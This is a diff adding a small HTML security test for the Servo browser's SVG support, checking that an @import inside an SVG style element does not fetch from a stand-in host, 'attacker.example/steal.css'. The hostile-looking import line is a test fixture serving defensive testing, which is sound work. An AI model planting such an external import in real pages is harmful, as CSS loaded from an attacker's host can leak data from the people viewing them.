@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Layer 2b — @import in SVG &lt;style&gt;</title>
+</head>
+<body>
+
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100">
+  <style>
+    @import url(https://attacker.example/steal.css);
+    .box { fill: red; }
+  </style>
+  <rect class="box" x="0" y="0" width="100" height="100"/>
+</svg>
+
+<!--
+  Expected: no request to attacker.example. The SVG <style> is a plain
+  SVGElement (never an HTMLStyleElement), so @import never runs. The class
+  rule ".box { fill: red }" is still applied by servo-svg's own class-only
+  collector, so the rect renders red.
+
+  Run with:
+    ./target/debug/servoshell.exe -z --window-size=200x100 -o out.png \
+      file:///D:/Projects/svg-tests/security/layer2_import_fetch.html \
+      --pref layout_servo_svg_enabled
+-->
+</body>
+</html>
